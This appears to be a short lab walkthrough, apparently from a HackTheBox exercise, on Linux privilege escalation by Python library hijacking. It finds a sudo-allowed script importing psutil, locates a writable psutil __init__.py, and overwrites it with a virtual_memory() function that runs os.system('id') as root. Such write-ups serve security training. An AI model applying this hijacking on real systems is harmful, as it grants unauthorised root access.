Take for example you find that your user can run a custom python script as root:
```
htb-student@ubuntu:/usr/local/lib/python3.8/dist-packages/psutil$ sudo -l
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User htb-student may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```
1)Checking what is inside in the script
```
cat /home/htb-student/mem_status.py
#!/usr/bin/env python3
import psutil 
available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```
2)Psutil is used as import
3)Let's check where it gets loaded from
```
pip3 show psutil
Name: psutil
Version: 5.9.5
Summary: Cross-platform lib for process and system monitoring in Python.
Home-page: https://github.com/giampaolo/psutil
Author: Giampaolo Rodola
Author-email: g.rodola@gmail.com
License: BSD-3-Clause
Location: /usr/local/lib/python3.8/dist-packages
Requires: 
Required-by: 
```
4)Checking the folder **/usr/local/lib/python3.8/dist-packages/psutil**
```
total 484
drwxr-sr-x 4 root        staff   4096 Jun  7 10:22 ./
drwxrwsr-x 6 root        staff   4096 Jun  5 13:47 ../
-rw-r--r-- 1 root        staff  29181 May 19 10:04 _common.py
-rw-r--r-- 1 root        staff  15025 May 19 10:04 _compat.py
-rw-r--r-- 1 htb-student staff     94 Aug  3 08:07 __init__.py
-rw-r--r-- 1 root        staff  18665 May 19 10:04 _psaix.py
-rw-r--r-- 1 root        staff  31769 May 19 10:04 _psbsd.py
-rw-r--r-- 1 root        staff  86913 May 19 10:04 _pslinux.py
-rw-r--r-- 1 root        staff  16275 May 19 10:04 _psosx.py
-rw-r--r-- 1 root        staff   8245 May 19 10:04 _psposix.py
-rw-r--r-- 1 root        staff  25486 May 19 10:04 _pssunos.py
-rwxr-xr-x 1 root        staff 107400 May 19 10:04 _psutil_linux.abi3.so*
-rwxr-xr-x 1 root        staff  71008 May 19 10:04 _psutil_posix.abi3.so*
-rw-r--r-- 1 root        staff  37425 May 19 10:04 _pswindows.py
drwxr-sr-x 2 root        staff   4096 Aug  3 08:07 __pycache__/
drwxr-sr-x 3 root        staff   4096 Jun  5 13:47 tests/
```
5)We have write permissions on **init.py** which means we can inject the code
```
echo "" > __init__.py
```
6)Inject your code ex:
```
#!/usr/bin/env python3
import os
def virtual_memory():
    os.system('id')
```
7)When you run the script it should invoke the code you injected instead
OBS: This time we had write permissions only on one file, if you had on more you have to check which file have that function "def virtual memory":
```
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
```